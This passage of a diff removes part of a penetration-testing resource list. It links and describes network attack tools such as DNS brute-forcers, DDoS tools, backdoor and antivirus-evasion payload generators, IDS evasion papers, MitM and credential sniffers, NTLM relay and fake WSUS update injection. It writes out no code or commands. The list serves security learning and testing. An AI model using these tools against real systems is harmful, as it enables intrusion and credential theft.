-		* TXDNS is a Win32 aggressive multithreaded DNS digger. Capable of placing, on the wire, thousands of DNS queries per minute. TXDNS main goal is to expose a domain namespace trough a number of techniques: Typos: Mised, doouble and transposde keystrokes; TLD/ccSLD rotation; Dictionary attack; Full Brute-force attack using alpha, numeric or alphanumeric charsets; Reverse grinding.
-	* [nsec3map](https://github.com/anonion0/nsec3map)
-		* a tool to enumerate the resource records of a DNS zone using its DNSSEC NSEC or NSEC3 chain
-	* [passivedns](https://github.com/gamelinux/passivedns)
-		* A tool to collect DNS records passively
-	* [DNS Recon](https://github.com/darkoperator/dnsrecon)
-	* [DNSEnum](https://github.com/fwaeytens/dnsenum)
-		* Multithreaded perl script to enumerate DNS information of a domain and to discover non-contiguous ip blocks.
-
-
-
-
-
-------------
-### <a name="ddos"></a>D/DOS
-* [Denial-of-service attack - Wikipedia](https://en.wikipedia.org/wiki/Denial-of-service_attack)
-* [Davoset](https://github.com/MustLive/DAVOSET) 
-	* DAVOSET - it is console (command line) tool for conducting DDoS attacks on the sites via Abuse of Functionality and XML External Entities vulnerabilities at other sites.
-
-
-
--------------
-### <a name="frameworks"></a>Frameworks
-* [BackDoor Factory](https://github.com/secretsquirrel/the-backdoor-factory)
-	* The goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state.
-	* [Wiki](https://github.com/secretsquirrel/the-backdoor-factory/wiki)
-	* [Video](http://www.youtube.com/watch?v=jXLb2RNX5xs)
-* [Man-in-the-Middle Framework](https://github.com/byt3bl33d3r/MITMf)
-	* Framework for Man-In-The-Middle attacks
-* [Veil](https://github.com/Veil-Framework/Veil)
-	* Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions.
-	* Veil Tutorials:
-		* [Framework Usage Tutorial](https://www.veil-framework.com/veil-tutorial/)
-		* [Payload Creation Tutorial](https://www.veil-framework.com/tutorial-veil-payload-development/)
-		* [Customizing backdoors with Veil](https://www.veil-framework.com/how-to-customize-backdoor-factory-payloads-within-veil/)
-		* [Creating a windows payload](https://www.youtube.com/watch?v=v1OXNP_bl8U)
-* [Adventures in Asymmetric Warfare by Will Schroeder](https://www.youtube.com/watch?v=53qQfCkVM_o)
-
-
-
-------------
-### <a name="evasion">icmp</a>ICMP
-* [ICMP RFC - Network Sorcery](http://www.networksorcery.com/enp/protocol/icmp.htm)
-* [RFC 792 - Internet Control Message Protocol](https://tools.ietf.org/html/rfc792)
-* [Internet Control Message Protocol - Wikipedia](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol)
-* [BlackNurse attack PoC](https://github.com/jedisct1/blacknurse)
-	* A simple PoC for the Blacknurse attack. "Blacknurse is a low bandwidth ICMP attack that is capable of doing denial of service to well known firewalls".
-
-
-------------
-### <a name="evasion">IDS/IPS Evasion</a>
-* [Intrusion Detection System](https://en.wikipedia.org/wiki/Intrusion_detection_system)
-* [Intrusion detection evasion:  How Attackers get past the burglar alarm](http://www.sans.org/reading-room/whitepapers/detection/intrusion-detection-evasion-attackers-burglar-alarm-1284)
-	* The purpose of this paper is to show methods that attackers can use to fool IDS systems into thinking their attack is legitimate traffic. With techniques like obfuscation, fragmentation, Denial of Service, and application hijacking the attacker can pass traffic under the nose of an IDS to prevent their detection. These are techniques that the next generation of IDS needs to be able to account for and prevent. Since it would be almost impossible to create a product that was not vulnerable to one of these deceptions.
-* [Beating the IPS](http://www.sans.org/reading-room/whitepapers/intrusion/beating-ips-34137) 
-	* This paper introduces various Intrusion Prevention System (IPS) evasion techniques and shows how they can be used to successfully evade detection by widely used products from major security vendors. By manipulating the header, payload, and traffic flow of a well-known attack, it is possible to trick the IPS inspection engines into passing the traffic - allowing the attacker shell access to the target system protected by the IPS.
-* [Firewall/IDS Evasion and Spoofing](https://nmap.org/book/man-bypass-firewalls-ids.html)
-* [IDS/IPS Evasion Techniques - Alan Neville](http://www.redbrick.dcu.ie/~anev/IDS_IPS_Evasion_Techniques.pdf)
-* [Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection](http://insecure.org/stf/secnet_ids/secnet_ids.html)http://insecure.org/stf/secnet_ids/secnet_ids.html)
-* [Evading IDS/IPS by Exploiting IPv6 Features - Antonios Atlasis, Rafael Schaefer](https://www.youtube.com/watch?v=avMeYIaU8DA&list=PL1eoQr97VfJni4_O1c3kBCCWwxu-6-lqy)
-* [wafw00f](https://github.com/sandrogauci/wafw00f) *  WAFW00F allows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website.
-* [HTTP Evasions Explained - Part 6 - Attack of the White-Space](http://noxxi.de/research/http-evader-explained-6-whitespace.html)
-	* This is part six in a series which will explain the evasions done by HTTP Evader. This part is about misusing white-space to bypass the firewall.
-* [Fire Away Sinking the Next Gen Firewall Russell Butturini - Derbycon6](https://www.youtube.com/watch?v=Qpty_f0Eu7Y)
-* [Passive IPS Reconnaissance and Enumeration - false positive (ab)use - Arron Finnon](https://vimeo.com/108775823)
-	* Network Intrusion Prevention Systems or NIPS have been plagued by "False Positive" issues almost since their first deployment. A "False Positive" could simply be described as incorrectly or mistakenly detecting a threat that is not real. A large amount of research has gone into using "False Positive" as an attack vector either to attack the very validity of an IPS system or to conduct forms of Denial of Service attacks. However the very reaction to a "False Positive" in the first place may very well reveal more detailed information about defences than you might well think.
-* [Attacking Nextgen Firewalls](https://www.youtube.com/watch?v=ZoCf9yWC32g)
-* [Dalton](https://github.com/secureworks/dalton)
-	* Dalton is a system that allows a user to quickly and easily run network packet captures ("pcaps") against an intrusion detection system ("IDS") sensor of his choice (e.g. Snort, Suricata) using defined rulesets and/or bespoke rules.
-
-
-
-------------
-### <a name="ipspoofing"></a>IP Spoofing
-* [State of IP Spoofing](https://spoofer.caida.org/summary.php)
-
-
-
-
-
-------------
-### <a name="ipmi"></a>IPMI
-* [Intelligent Platform Managment Interface Documentation - Intel](https://www.intel.com/content/www/us/en/servers/ipmi/ipmi-home.html)
-* [IPMI Basics](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)
-* [Intelligent Platform Management Interface - Wikipedia](https://en.wikipedia.org/wiki/Intelligent_Platform_Management_Interface)
-* [A Penetration Tester's Guide to IPMI and BMCs](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)
-* [OpenIPMI](http://openipmi.sourceforge.net/)
-* [Breaking IPMI/BMC](http://fish2.com/ipmi/how-to-break-stuff.html)
-* [IPMI – A Gentle Introduction with OpenIPMI](http://openipmi.sourceforge.net/IPMI.pdf)
-
-
-
-
-------------
-### <a name="ipv6">IPv6 Related</a>
-[IPv6—101: Introduction - F5](http://securite.net.au/wp-content/uploads/2014/05/F5s-IPV6-Introduction.pdf)
-* [Introduction to IPv6 Fundamentals - Cisco](https://www.youtube.com/watch?v=PdGLmeq-6Bg)
-* [IPv6 - Wikipedia](https://en.wikipedia.org/wiki/IPv6)
-* [RFC 2460 - Internet Protocol, Version 6 (IPv6)](https://tools.ietf.org/html/rfc2460)
-* IPv6: Basic Attacks and Defences - Christopher Werny[TROOPERS15]
-	* [Part 1](https://www.youtube.com/watch?v=Y8kjQEGHbAU)
-	* [Part 2](https://www.youtube.com/watch?v=V-GYPp-j-lE)
-	* [Exploiting Tomorrow's Internet Today: Penetration testing with IPv6](http://uninformed.org/?v=all&a=46&t=sumry)
-	* This paper illustrates how IPv6-enabled systems with link-local and auto-configured addresses can be compromised using existing security tools. While most of the techniques described can apply to "real" IPv6 networks, the focus of this paper is to target IPv6-enabled systems on the local network. 
-* [IPv6 Toolkit](https://github.com/fgont/ipv6toolkit)
-	* SI6 Networks' IPv6 Toolkit
-* [THC-IPv6](https://www.thc.org/thc-ipv6/)
-	*  A complete tool set to attack the inherent protocol weaknesses of IPV6
- and ICMP6, and includes an easy to use packet factory library.
-* [[TROOPERS15] Merike Kaeo - Deploying IPv6 Securely - Avoiding Mistakes Others Have Made](https://www.youtube.com/watch?v=rQg4y78xHf8)
-* [IPv6 Local Neighbor Discovery Using Router Advertisement](https://www.rapid7.com/db/modules/auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement)
-	* Send a spoofed router advertisement with high priority to force hosts to start the IPv6 address auto-config. Monitor for IPv6 host advertisements, and try to guess the link-local address by concatinating the prefix, and the host portion of the IPv6 address. Use NDP host solicitation to determine if the IP address is valid'
-* [IPv6 - Playing with IPv6 for fun and profit](https://github.com/zbetcheckin/IPv6)
-
-
-
-------------
-#### <a name="kerberos"></a>Kerberos
-Kerberos
-* 
-
-------------
-#### <a name="ldap"></a>LDAP
-* [Lightweight Directory Access Protocol - Wikipedia](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol)
-* [Basic LDAP Concepts - ldap.com](https://www.ldap.com/basic-ldap-concepts)
-* [Lightweight Directory Access Protocol (LDAP): Technical Specification Road Map](https://tools.ietf.org/html/rfc4510)
-* [Lightweight Directory Access Protocol (LDAP): The Protocol](https://tools.ietf.org/html/rfc4511)
-* Attacking
-	* [Public Facing LDAP Enumeration](https://www.lanmaster53.com/2013/05/24/public-facing-ldap-enumeration/)
-	* [Dangers of LDAP NULL Base and Bind](https://securitysynapse.blogspot.com/2013/09/dangers-of-ldap-null-base-and-bind.html)
-* Tools
-	* [JXplorer](http://jxplorer.org/)
-		* JXplorer is a cross platform LDAP browser and editor. It is a standards compliant general purpose LDAP client that can be used to search, read and edit any standard LDAP directory, or any directory service with an LDAP or DSML interface. It is highly flexible and can be extended and customised in a number of ways. JXplorer is written in java, and the source code and Ant build system are available via svn or as a packaged build for users who want to experiment or further develop the program. 
-	* [LDAPMfINER](http://ldapminer.sourceforge.net/)
-		* This is a tool I wrote to collect information from different LDAP Server implementation. This was written in C with the Netscape C 
-	* [Softera LDAP Browser](http://www.ldapbrowser.com/info_softerra-ldap-browser.htm)
-		* LDAP Browser that supports most LDAP implementations. Non-free software, 30-day free trial
-
-
-### <a name="mitm"></a>MitM Tools
-* [Dsniff](http://www.monkey.org/~dugsong/dsniff/)
-	* dsniff is a collection of tools for network auditing and penetration testing. dsniff, filesnarf, mailsnarf, msgsnarf, urlsnarf, and webspy passively monitor a network for interesting data (passwords, e-mail, files, etc.). arpspoof, dnsspoof, and macof facilitate the interception of network traffic normally unavailable to an attacker (e.g, due to layer-2 switching). sshmitm and webmitm implement active monkey-in-the-middle attacks against redirected SSH and HTTPS sessions by exploiting weak bindings in ad-hoc PKI. 
-* [Ettercap](https://ettercap.github.io/ettercap/)
-	* Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.
-* [net-creds](https://github.com/DanMcInerney/net-creds)
-	* Thoroughly sniff passwords and hashes from an interface or pcap file. Concatenates fragmented packets and does not rely on ports for service identification. It sniffs: URLs visited; POST loads sent; HTTP form logins/passwords; HTTP basic auth logins/passwords; HTTP searches; FTP logins/passwords; IRC logins/passwords; POP logins/passwords; IMAP logins/passwords; Telnet logins/passwords; SMTP logins/passwords; SNMP community string; NTLMv1/v2 all supported protocols like HTTP, SMB, LDAP, etc; Kerberos.
-* RDP
-	* [Seth](https://github.com/SySS-Research/Seth)
-		* Seth is a tool written in Python and Bash to MitM RDP connections. It attempts to downgrade the connection and extract clear text credentials.
-* NTLM/SMB/NTBS
-	* [NTLMssp-Extract](https://github.com/sinnaj-r/NTLMssp-Extract)
-		* A small Python-Script to extract NetNTLMv2 Hashes from NTMLssp-HTTP-Authentications, which were captured in a pcap.
-	* [ntlmRelayToEWS](https://github.com/Arno0x/NtlmRelayToEWS)
-		* ntlmRelayToEWS is a tool for performing ntlm relay attacks on Exchange Web Services (EWS). It spawns an SMBListener on port 445 and an HTTPListener on port 80, waiting for incoming connection from the victim. Once the victim connects to one of the listeners, an NTLM negociation occurs and is relayed to the target EWS server.
-* SSL/TLS
-	* [SSLsplit - transparent and scalable SSL/TLS interception](https://www.roe.ch/SSLsplit)
-		* SSLsplit is a tool for man-in-the-middle attacks against SSL/TLS encrypted network connections. Connections are transparently intercepted through a network address translation engine and redirected to SSLsplit. SSLsplit terminates SSL/TLS and initiates a new SSL/TLS connection to the original destination address, while logging all data transmitted. SSLsplit is intended to be useful for network forensics and penetration testing.  SSLsplit supports plain TCP, plain SSL, HTTP and HTTPS connections over both IPv4 and IPv6.
-	* [SSLStrip](http://www.thoughtcrime.org/software/sslstrip/)
-		* This tool provides a demonstration of the HTTPS stripping attacks that I presented at Black Hat DC 2009. It will transparently hijack HTTP traffic on a network, watch for HTTPS links and redirects, then map those links into either look-alike HTTP links or homograph-similar HTTPS links. It also supports modes for supplying a favicon which looks like a lock icon, selective logging, and session denial.
-* WSUS(Windows Server Updater Serice)
-	* [WSUXploit](https://github.com/pimps/wsuxploit)
-		* This is a MiTM weaponized exploit script to inject 'fake' updates into non-SSL WSUS traffic. It is based on the WSUSpect Proxy application that was introduced to public on the Black Hat USA 2015 presentation, 'WSUSpect - Compromising the Windows Enterprise via Windows Update'
-
-
-
-
-
-------------
-#### <a name="modbus"></a>Modbus
-* See 'Modbus' in 'SCADA/Heavy Machinery'
-* [Modbus interface tutorial](https://www.lammertbies.nl/comm/info/modbus.html)
-
-
-------------
-#### <a name="MQTT"></a>MQTT
-* [MQTT](http://mqtt.org/)
-	* MQTT is a machine-to-machine (M2M)/"Internet of Things" connectivity protocol. It was designed as an extremely lightweight publish/subscribe messaging transport. 
-* [MQTT - Wikipedia](https://en.wikipedia.org/wiki/MQTT)
-* [MQTT 101 – How to Get Started with the lightweight IoT Protocol](https://www.hivemq.com/blog/how-to-get-started-with-mqtt)
-
-
-
-
-------------
-#### <a name="netbios"></a>Netbios
-* [NetBIOS - Wikipedia](https://en.wikipedia.org/wiki/NetBIOS)
-* [NetBIOS - rhyshaden.com](http://www.rhyshaden.com/netbios.htm)
-* [Local Network Attacks: LLMNR and NBT-NS Poisoning](https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning)
-* [NbtScan](http://www.unixwiz.net/tools/nbtscan.html)
-	* This is a command-line tool that scans for open NETBIOS nameservers on a local or remote TCP/IP network, and this is a first step in finding of open shares. It is based on the functionality of the standard Windows tool nbtstat, but it operates on a range of addresses instead of just one. I wrote this tool because the existing tools either didn't do what I wanted or ran only on the Windows platforms: mine runs on just about everything.
-* [Responder](https://github.com/lgandx/Responder)
-	* Responder an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http://support.microsoft.com/kb/163409). By default, the tool will only answer to File Server Service request, which is for SMB. The concept behind this is to target our answers, and be stealthier on the network. This also helps to ensure that we don't break legitimate NBT-NS behavior. You can set the -r option via command line if you want to answer to the Workstation Service request name suffix.
-
-
-
-
-------------
-#### <a name="host"></a>Network Host Discovery/Service Discovery:
-* Informational
-	* [Nmap you’re doing it wrong - sneakerhax](https://sneakerhax.com/nmap-yourre-doing-it-wrong/)
-	* [Recon at scale - sneakerhax](https://sneakerhax.com/recon-at-scale/)
-	* [Nmap Reference Guide](https://nmap.org/book/man.html)
-	* [Security.StackExchange Answer detailing Nmap Scanning tips and tactics - very good](https://security.stackexchange.com/questions/373/open-source-penetration-test-automation/82529#82529)
-	* [Massively Scaling your Scanning - SANS](https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning)
-	* [Mass Scanning the Internet: Tips, Tricks, Results - DEF CON 22 - Graham, Mcmillan, and Tentler](https://www.youtube.com/watch?v=nX9JXI4l3-E)
-* Firewall
-	* [Firewalk](http://packetfactory.openwall.net/projects/firewalk/)
-		* Firewalk is an active reconnaissance network security tool that attempts to determine what layer 4 protocols a  given IP forwarding device will pass. Firewalk  works  by sending out TCP or UDP packets with a TTL one greater than the targeted gateway.  If the gateway allows the traffic, it will forward the packets to the next hop where they will expire and elicit an ICMP_TIME_EXCEEDED  message.  If the gateway hostdoes not allow the traffic, it will likely drop the packets on  the floor and we will see no response. To get  the  correct  IP  TTL that will result in expired packets one beyond the gateway we need  to  ramp  up  hop-counts.   We  do  this  in the same manner that traceroute works.  Once we have the gateway hopcount (at  that point the scan is said to be `bound`) we can begin our scan.
-* General
-	* [Nmap](http://nmap.org/)
-		* Nmap ("Network Mapper") is a free and open source (license) utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. It was designed to rapidly scan large networks, but works fine against single hosts. Nmap runs on all major computer operating systems, and official binary packages are available for Linux, Windows, and Mac OS X. In addition to the classic command-line Nmap executable, the Nmap suite includes an advanced GUI and results viewer (Zenmap), a flexible data transfer, redirection, and debugging tool (Ncat), a utility for comparing scan results (Ndiff), and a packet generation and response analysis tool (Nping). 
-	* [NMAP - Port-Scanning: A Practical Approach Modified for better](https://www.exploit-db.com/papers/35425/)
-	* [NSEInfo](https://github.com/christophetd/nmap-nse-info/blob/master/README.md)
-	* NSEInfo is a tool to interactively search through nmap's NSE scripts.
-	* [Nmap (XML) Parser documentation](https://nmap-parser.readthedocs.io/en/latest/)
-	* [Scanning Effectively Through a SOCKS Pivot with Nmap and Proxychains](https://cybersyndicates.com/2015/12/nmap-and-proxychains-scanning-through-a-socks-piviot/)
-			* [Script](https://github.com/killswitch-GUI/PenTesting-Scripts/blob/master/Proxychains-Nmap.py)
-		* [ms15-034.nse Script](https://github.com/pr4jwal/quick-scripts/blob/master/ms15-034.nse)
-	* [Angry IP Scanner](http://angryip.org/)
-		* Angry IP Scanner (or simply ipscan) is an open-source and cross-platform network scanner designed to be fast and simple to use. It scans IP addresses and ports as well as has many other features. 
-	* [ScanCannon](https://github.com/johnnyxmas/ScanCannon)
-	* The speed of masscan with the reliability and detailed enumeration of nmap!
-	* [UnicornScan](http://www.unicornscan.org/)
-		* Unicornscan is a new information gathering and correlation engine built for and by members of the security research and testing communities. It was designed to provide an engine that is Scalable, Accurate, Flexible, and Efficient. It is released for the community to use under the terms of the GPL license. 
-		* Editor note: Use this to mass scan networks. It-s faster than nmap at scanning large host lists and allows you to see live hosts quickly.
-	* [hping](http://www.hping.org/)
-		* hping is a command-line oriented TCP/IP packet assembler/analyzer. The interface is inspired to the ping(8) unix command, but hping isn't only able to send ICMP echo requests. It supports TCP, UDP, ICMP and RAW-IP protocols, has a traceroute mode, the ability to send files between a covered channel, and many other features. 
-	* [Ever wanted to scan the internet in a few hours?](http://blog.erratasec.com/2013/10/faq-from-where-can-i-scan-internet.html)
-	* [Adding your protocol to Masscan](http://blog.erratasec.com/2014/11/adding-protocols-to-masscan.html)
-	* [Consul](https://github.com/hashicorp/consul)
-		* Consul is a tool for service discovery and configuration. Consul is distributed, highly available, and extremely scalable.
-	* [gateway-finder](https://github.com/pentestmonkey/gateway-finder)
-		* Gateway-finder is a scapy script that will help you determine which of the systems on the local LAN has IP forwarding enabled and which can reach the Internet.
-* Tor
-	* [exitmap](https://github.com/NullHypothesis/exitmap)
-		* A fast and modular scanner for Tor exit relays. http://www.cs.kau.se/philwint/spoiled_onions/ 
-	* [OnionScan](https://github.com/s-rah/onionscan)
-		* [What OnionScan Scans for](https://github.com/s-rah/onionscan/blob/master/doc/what-is-scanned-for.md)
-* VHost Scanning
-	* [hostmap](https://github.com/jekil/hostmap)
-		* hostmap is a free, automatic, hostnames and virtual hosts discovery tool written in Ruby by Alessandro Tanasi
-* Cloudflare
-	* [CloudFail](https://github.com/m0rtem/CloudFail)
-		* CloudFail is a tactical reconnaissance tool which aims to gather enough information about a target protected by CloudFlare in the hopes of discovering the location of the server.
-	* [HatCloud](https://github.com/HatBashBR/HatCloud)
-		* HatCloud build in Ruby. It makes bypass in CloudFlare for discover real IP. This can be useful if you need test your server and website. Testing your protection against Ddos (Denial of Service) or Dos. CloudFlare is services and distributed domain name server services, sitting between the visitor and the Cloudflare user's hosting provider, acting as a reverse proxy for websites. Your network protects, speeds up and improves availability for a website or the mobile application with a DNS change.
-* Cisco
-	* [CiscoRouter - tool](https://github.com/ajohnston9/ciscorouter)
-		* CiscoRouter is a tool for scanning Cisco-based routers over SSH. Rules can be created using accompanying CiscoRule application (see this repo) and stored in the "rules" directory.
-	* [discover - Kali Scripts](https://github.com/leebaird/discover)
-		* For use with Kali Linux - custom bash scripts used to automate various portions of a pentest.
-	* [changeme - A default credential scanner.](https://github.com/ztgrace/changeme)
-		* changeme picks up where commercial scanners leave off. It focuses on detecting default and backdoor credentials and not necessarily common credentials. It's default mode is to scan HTTP default credentials, but has support for other credentials. changeme is designed to be simple to add new credentials without having to write any code or modules. changeme keeps credential data separate from code. All credentials are stored in yaml files so they can be both easily read by humans and processed by changeme. Credential files can be created by using the ./changeme.py --mkcred tool and answering a few questions. changeme supports the http/https, mssql, mysql, postgres, ssh, ssh w/key, snmp, mongodb and ftp protocols. Use ./changeme.py --dump to output all of the currently available credentials.
-* [scanless](https://github.com/vesche/scanless)
-	* Command-line utility for using websites that can perform port scans on your behalf. Useful for early stages of a penetration test or if you'd like to run a port scan on a host and have it not come from your IP address.
-* [device-pharmer](https://github.com/DanMcInerney/device-pharmer)
-	* Opens 1K+ IPs or Shodan search results and attempts to login 
-
-
-* [Sn1per](https://github.com/1N3/Sn1per)
-	* Sn1per is an automated scanner that can be used during a penetration test to enumerate and scan for vulnerabilities.
-------------
-### <a name="nfs"></a>NFS
-* [Network File System](https://en.wikipedia.org/wiki/Network_File_System)
-* [NFS - ArchWiki](https://wiki.archlinux.org/index.php/NFS)
-* [Linux NFS Documentation](http://nfs.sourceforge.net/)
-	* This document provides an introduction to NFS as implemented in the Linux kernel. It links to developers' sites, mailing list archives, and relevant RFCs, and provides guidance for quickly configuring and getting started with NFS on Linux. A Frequently Asked Questions section is also included. This document assumes the reader is already familiar with generic NFS terminology.
-* [NfSpy](https://github.com/bonsaiviking/NfSpy)
-	* NfSpy is a Python library for automating the falsification of NFS credentials when mounting an NFS share.
-* [Using nfsshell to compromise older environments](https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/)
-* [Abusing Hardlinks Via NFS](http://pentestmonkey.net/blog/nfs-hardlink)
-* [Exploiting Network File System, (NFS), shares - vulnerabilityassessment.co.uk](http://www.vulnerabilityassessment.co.uk/nfs.htm)
-* [NFS: Network File System Protocol Specification - rfc1094](https://tools.ietf.org/html/rfc1094)
-
-
-------------
-### <a name="pivot"></a>Pivoting
-* Really, look at the Pivoting section in Post Exploitation/Privilege Escalation
-
-
-
-
-------------
-#### <a name="proxy"></a>Proxies
-
-
-* [Mallory](https://bitbucket.org/IntrepidusGroup/mallory)
-	* Mallory is an extensible TCP/UDP man in the middle proxy that is designed  to be run as a gateway. Unlike other tools of its kind, Mallory supports  modifying non-standard protocols on the fly.
-* [SSLStrip](http://www.thoughtcrime.org/software/sslstrip/)
-	* This tool provides a demonstration of the HTTPS stripping attacks that I presented at Black Hat DC 2009. It will transparently hijack HTTP traffic on a network, watch for HTTPS links and redirects, then map those links into either look-alike HTTP links or homograph-similar HTTPS links. It also supports modes for supplying a favicon which looks like a lock icon, selective logging, and session denial.
-* [Echo Mirage](http://www.wildcroftsecurity.com/echo-mirage)
-	* Echo Mirage is a generic network proxy. It uses DLL injection and function hooking techniques to redirect network related function calls so that data transmitted and received by local applications can be observed and modified. Windows encryption and OpenSSL functions are also hooked so that plain text of data being sent and received over an encrypted session is also available. Traffic can be intercepted in real-time, or manipulated with regular expressions and a number of action directives
-* [Burp Proxy](http://portswigger.net/burp/proxy.html)
-	* Burp Proxy is an intercepting proxy server for security testing of web applications. It operates as a man-in-the-middle between your browser and the target application
-* [Charles Proxy](https://www.charlesproxy.com/)
-	* Charles is an HTTP proxy / HTTP monitor / Reverse Proxy that enables a developer to view all of the HTTP and SSL / HTTPS traffic between their machine and the Internet. This includes requests, responses and the HTTP headers (which contain the cookies and caching information).
-* [OWASP Zed Attack Proxy](http://www.zaproxy.org/)
-	* [Zed Attack Proxy (ZAP) Community Scripts](https://github.com/zaproxy/community-scripts)
-		* A collection of ZAP scripts provided by the community - pull requests very welcome! 
-* [Phreebird](http://dankaminsky.com/phreebird/) 
-	* Phreebird is a DNSSEC proxy that operates in front of an existing DNS server (such as BIND, Unbound, PowerDNS, Microsoft DNS, or QIP) and supplements its records with DNSSEC responses. Features of Phreebird include automatic key generation, realtime record signing, support for arbitrary responses, zero configuration, NSEC3 -White Lies-, caching and rate limiting to deter DoS attacks, and experimental support for both Coarse Time over DNS and HTTP Virtual Channels. The suite also contains a large amount of sample code, including support for federated identity over OpenSSH. Finally, -Phreeload- enhances existing OpenSSL applications with DNSSEC support.
-* [TCP Catcher](http://www.tcpcatcher.org/)
-	* TcpCatcher is a free TCP, SOCKS, HTTP and HTTPS proxy monitor server software. 
-* [DNS Chef](https://github.com/amckenna/DNSChef)
-	* This is a fork of the DNSChef project v0.2.1 hosted at: http://thesprawl.org/projects/dnschef/
-* [Squid Proxy](http://www.squid-cache.org/)
-	* Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages. Squid has extensive access controls and makes a great server accelerator. It runs on most available operating systems, including Windows and is licensed under the GNU GPL.
-* [SharpSocks](https://github.com/nettitude/SharpSocks)
-	* Tunnellable HTTP/HTTPS socks4a proxy written in C# and deployable via PowerShell
-* [ssf - Secure Socket Funneling](https://github.com/securesocketfunneling/ssf)
-	* Network tool and toolkit. It provides simple and efficient ways to forward data from multiple sockets (TCP or UDP) through a single secure TLS tunnel to a remote computer. SSF is cross platform (Windows, Linux, OSX) and comes as standalone executables.
-* [PowerCat](https://github.com/secabstraction/PowerCat)
-	* A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat
-
-
-
-
-
--------------
-### <a name="pxe"></a>PXE
-* [Use DHCP to detect UEFI or Legacy BIOS system and PXE boot to SCCM](http://www.itfaq.dk/2016/07/27/use-dhcp-to-detect-uefi-or-legacy-bios-system-and-pxe-boot-to-sccm/)
-
-
-
-RabbitMQ/ZeroMQ
-* [Enteletaor](https://github.com/cr0hn/enteletaor)
-	* Message Queue & Broker Injection tool that implements attacks to Redis, RabbitMQ and ZeroMQ.
-* [RabbitMQ - Wikipedia](https://en.wikipedia.org/wiki/RabbitMQ)
-
-
-
-
-
-
--------------
-### <a name="sdn"></a>Software Defined Networking (SDN)
-* [DELTA: SDN SECURITY EVALUATION FRAMEWORK](https://github.com/OpenNetworkingFoundation/DELTA)
-	* DELTA is a penetration testing framework that regenerates known attack scenarios for diverse test cases. This framework also provides the capability of discovering unknown security problems in SDN by employing a fuzzing technique.
-
-
-
-
-
-
-------------
-#### <a name="SIP"></a>SIP/VOIP:
-* [A Hitchhiker's Guide to the Session Initiation Protocol (SIP)](https://tools.ietf.org/html/rfc5411)
-* [Session Initiation Protocol - Wikipedia](https://en.wikipedia.org/wiki/Session_Initiation_Protocol)
-* [sipvicious](https://github.com/EnableSecurity/sipvicious)
-* [bluebox-ng](https://github.com/jesusprubio/bluebox-ng)
-	* Pentesting framework using Node.js powers, focused in VoIP.
-
-
-
-
-
-
-------------
-#### <a name="smb"></a>SMB
-
-* [Server Message Block - Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block)
-* [Microsoft SMB Protocol and CIFS Protocol Overview](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365233(v=vs.85).aspx)
-* [WinNT/Win95 Automatic Authentication Vulnerability (IE Bug #4)](http://insecure.org/sploits/winnt.automatic.authentication.html)
-* [SMB: Sharing More than Just Your Files - BH USA 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Brossard-SMBv2-Sharing-More-Than-Just-Your-Files.pdf)
-* [Stealing Windows Credentials Using Google Chrome](http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf)
-* [SMB Relay Demystified and NTLMv2 Pwnage with Python](https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python)
-* [Responder](https://github.com/lgandx/Responder)
-	* Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.
-* [SPEAR: Redirect to SMB](https://blog.cylance.com/content/dam/cylance/pdfs/white_papers/RedirectToSMB.pdf)
-* [Resurrection of the Living Dead: The “Redirect to SMB” Vulnerability](http://blog.trendmicro.com/trendlabs-security-intelligence/resurrection-of-the-living-dead-the-redirect-to-smb-vulnerability/)
-
-------------
-#### <a name="smtp"></a>SMTP:
-* [RFC 821 - SIMPLE MAIL TRANSFER PROTOCOL](https://tools.ietf.org/html/rfc821)
-* [RFC 5321 - Simple Mail Transfer Protocol](https://tools.ietf.org/html/rfc5321)
-* [Simple Mail Transfer Protocol - Wikipedia](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol)
-* [Simple Mail Transfer Protocol - msdn](https://msdn.microsoft.com/en-us/library/aa480435.aspx)
-* [SMTP User Enumeration](https://pentestlab.blog/2012/11/20/smtp-user-enumeration/)
-* [Swaks - Swiss Army Knife for SMTP](http://www.jetmore.org/john/code/swaks/)
-
-
-
-
-------------
-#### <a name="snmp"></a>SNMP:
-* [Simple Network Management Protocol - Wikipedia](https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol)
-* [SNMP Attacks and Security - Mauno Pihelgas](https://home.cyber.ee/~ahtbu/CDS2011/MaunoPihelgasSlides.pdf)
-* [SNMP REFLECTION/AMPLIFICATION](https://www.incapsula.com/ddos/attack-glossary/snmp-reflection.html)*
-* [Onesixtyone](http://www.phreedom.org/software/onesixtyone/)
